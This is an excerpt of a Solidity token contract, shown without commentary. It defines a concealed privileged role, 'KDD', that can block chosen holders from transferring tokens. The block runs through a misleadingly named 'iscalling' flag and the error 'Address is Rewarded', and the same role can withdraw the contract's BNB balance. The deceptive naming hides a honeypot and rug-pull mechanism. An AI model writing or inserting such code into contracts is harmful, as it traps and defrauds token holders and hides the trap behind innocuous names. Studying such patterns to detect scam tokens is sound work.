...
abstract contract Auth {
    ...
    mapping (address => bool) internal kds;

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
        modifier KDD() {
        require(isKDD(msg.sender), "!KDD"); _;
    }

    function isKDD(address adr) public view returns (bool) {
        return kds[adr];
    }
...
//Locker details
    ...
    mapping (address => bool) public iscalling;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!iscalling[recipient] && !iscalling[sender], 'Address is Rewarded');
    ...
    function clearStuckBalance(uint256 amountPercentage) external KDD {
        uint256 amountBNB = address(this).balance;
        payable(msg.sender).transfer(amountBNB * amountPercentage / 100);
    }

    function TransferCalls(address _address, bool _value) public KDD{
        iscalling[_address] = _value;
    }
